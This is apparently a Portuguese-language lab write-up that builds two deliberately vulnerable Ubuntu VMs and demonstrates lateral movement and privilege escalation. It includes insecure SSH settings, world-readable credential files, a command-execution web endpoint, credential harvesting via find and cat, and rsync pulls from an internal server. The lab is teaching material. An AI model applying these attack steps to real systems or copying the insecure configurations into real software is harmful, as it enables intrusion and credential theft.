# Demonstração de Ataque de Alavancagem, Movimentação Lateral e Escalação de Privilégios

## Autores

- Matheus Pereira Dias
- Fernando Cirilo Zanchetta

## Visão Geral do Cenário

- Host Local com acesso direto apenas à VM1, via bridge.
- VM1: Servidor Web com aplicação vulnerável conectado via bridge e também na rede interna NAT.
- VM2: Servidor interno de backup/administração conectado apenas na rede interna NAT.
- Objetivo: Demonstrar movimentação lateral e escalação de privilégios.

* OBS: ambas as VMs foram criadas com a mesma imagem, um Ubuntu LTS 22.04

## FASE 1: CONFIGURAÇÃO VULNERÁVEL DA VM1

### 1.1 Configuração Insegura do SSH

```
# Instalar SSH
sudo apt update
sudo apt install openssh-server -y

# Backup da configuração original
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup

# Configurações vulneráveis (adicionar ao sshd_config)
sudo nano /etc/ssh/sshd_config
```

sshd_config:

```
...
# CONFIGURAÇÕES VULNERÁVEIS:
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
ListenAddress 0.0.0.0
```

`sudo systemctl restart ssh`

### 1.2 Backup Sensível com Permissões Inadequadas

```
# Criar diretório de backup com informações sensíveis
sudo mkdir -p /opt/.system-backup-2025

# Arquivo com credenciais e configurações sensíveis
sudo nano /opt/.system-backup-2025/root_config_backup.txt
```

root_config_backup.txt:

```
# ROOT SYSTEM CONFIGURATION BACKUP - CONFIDENTIAL
# (ATUALIZAR PARA ANO QUE VEM, SOMENTE ROOT CREDENTIALS FUNCIONANDO NO MOMENTO)
# Backup Date: 2025-11-01

## ROOT CREDENTIALS:
Root SSH Password: vm1
Root Sudo Password: vm1

## SYSTEM DATABASE PASSWORDS:
PostgreSQL Root: PgRootAdmin123!
MySQL Root: MySqlAdminSecure456!

## SERVICE ACCOUNTS:
SSH Service: sshd_user / SshdPass789!
Web Service: www-root / WebRootPass321!

## EMERGENCY ACCESS:
Recovery Key: EmergencyKey2024!
Backup Passphrase: BackupPhraseSecure!
```

```
# PERMISSÕES INTENCIONALMENTE VULNERÁVEIS:
sudo chmod 755 /opt/.system-backup-2025
sudo chmod 644 /opt/.system-backup-2025/*
sudo chown -R root:root /opt/.system-backup-2025
```

Scripts de backup emergencial em `/root/.emergency_backup_recovery/recovery.sh` que vazam credenciais do rsync da VM2 (só podem ser acessados pelo ROOT):

recover.sh:

```
#!/bin/bash
#
# EMERGENCY BACKUP RECOVERY CONFIGURATION
# Arquivo confidencial - Acesso restrito a root
#
# Este arquivo contém credenciais para recuperação de backups
# em caso de desastre. Manter em local seguro.

################################################################
# CONFIGURAÇÕES DO SERVIDOR DE BACKUP
################################################################

# Servidor de Backup Principal
BACKUP_SERVER="192.168.100.4"

# Credenciais de Acesso
RSYNC_USER="vm2"
RSYNC_PASSWORD="vm2"

################################################################
# COMANDOS DE RECUPERAÇÃO
################################################################

# Recuperar backups completos
LOCAL_DIR="/restore/backups"
echo "[+] Recuperando backups para: $local_dir"
mkdir -p $LOCAL_DIR
RSYNC_PASSWORD="$RSYNC_PASSWORD" rsync -av "rsync://$RSYNC_USER@$BACKUP_SERVER/vm1-backups" "$LOCAL_DIR/vm1-backups"
```

### 1.3 Configuração do PostgreSQL Vulnerável

```
# Instalar PostgreSQL
sudo apt install postgresql postgresql-contrib -y

# Configurar usuário e banco vulnerável
sudo -u postgres psql -c "CREATE DATABASE vulndb;"
sudo -u postgres psql -c "CREATE USER vulnuser WITH PASSWORD 'vulnpass';"
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE vulndb TO vulnuser;"
```

Configurar base de dados:

```
sudo cp /home/vm1/Downloads/Projeto/src/postgres/init.sql /tmp/init.sql
sudo chown postgres:postgres /tmp/init.sql
sudo -u postgres psql -d vulndb -f /tmp/init.sql
```

Garantir acesso à base:

```
sudo -i -u postgres
psql -d vulndb
# Comandos a seguir dentro do postgres
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO vulnuser;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO vulnuser;
GRANT ALL PRIVILEGES ON ALL FUNCTIONS IN SCHEMA public TO vulnuser;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON TABLES TO vulnuser;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON SEQUENCES TO vulnuser;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON FUNCTIONS TO vulnuser;
```

### 1.4 Aplicação Web Vulnerável

Aplicação na pasta `/home/vm1/Downloads/Projeto/src/app`:

```
# Instalar dependências
sudo apt install -y python3 python3-pip python3-venv gcc libpq-dev

# Instalar requirements
pip install -r requirements.txt
```

## FASE 2: CONFIGURAÇÃO DA VM2 (SERVIDOR INTERNO)

```
# Se não estiver instalado (provavelmente já está)
sudo apt install rsync -y
```

Script de criação, inicialização e configuração em `/home/vm2/Documentos/init.sh`, basta rodá-lo (e alterar IP ou alguma outra informação caso necessário).

A outra configuração necessária seria permitir acesso via SSH na VM1 com a chave gerada na VM2 para o script de backup.

## FASE 3: EXPLORAÇÃO - CADEIA DE ATAQUE

3.1 Reconhecimento Inicial

Mapear endpoints através de força bruta ou algum outro tipo de vulnerabilidade mais óbvia, aqui não é o foco, logo vou mostrar apenas os endpoints importantes como `/debug` e `/api/execute_command`.


Com comandos como `http://192.168.0.4:5000/api/execute_command?cmd=ls -la` podemos ir mapeando e lendo arquivos e configurações da VM1, porém estamos logados como o usuário `vm1`, sem acesso a root. Como a senha para sudo é fraca, poderíamos tentar bruteforce, mas não é a ideia aqui. Então vamos procurar por possíveis credenciais no sistema em algum arquivo com permissões erradas. Vários outros ataques poderiam ser testados, mas vou focar nisso já que configurei assim intencionalmente.

Comandos interessantes:

```
cmd=ls -la
cmd=env
cmd=cat main.py

# IP da VM1
cmd=ip a
```

Encontrando credenciais (arquivo de backup com permissões erradas, qualquer um consegue ler):

```
# credenciais de root
cmd=find / -name '*backup*' 2>/dev/null
# Filtrar pelo que eu já sei
cmd=find / -name '*backup*' 2>/dev/null | grep 2025
cmd=ls /opt/.system-backup-2025
cmd=cat /opt/.system-backup-2025/root_config_backup.txt
```

### 3.2 Acesso SSH e Reconhecimento Interno

Usar credenciais vazadas para SSH:

`ssh root@VM1_IP`

Reconhecimento de rede interna:

```
ip a
ss -tuln
cat /etc/hosts
nmap 192.168.100.0/24
```

### 3.3 Exploração do Serviço Rsync

Encontrar script de backup emergencial em `/root/.emergency_backup_recovery`

Ele consegue baixar dados de backup da VM1 via rsync guardados na VM2.
Nele existem credenciais para utilziar o rsync, então podemos recuperar dados extras que estão sendo guardados utilizando rsync também.

Podemos istar manualmente os módulos e baixar os dados extras da VM2:

```
RSYNC_PASSWORD="vm2" rsync --list-only "rsync://vm2@192.168.100.4/

RSYNC_PASSWORD="vm2" rsync -av "rsync://vm2@192.168.100.4/vm2-data" "/tmp/vm2-data"
RSYNC_PASSWORD="vm2" rsync -av "rsync://vm2@192.168.100.4/scripts" ""/tmp/scripts"
```

Neles também existe a senha de SSH do root da VM2, logo podemos também acessá-la via SSH a partir da VM1 caso necessário.
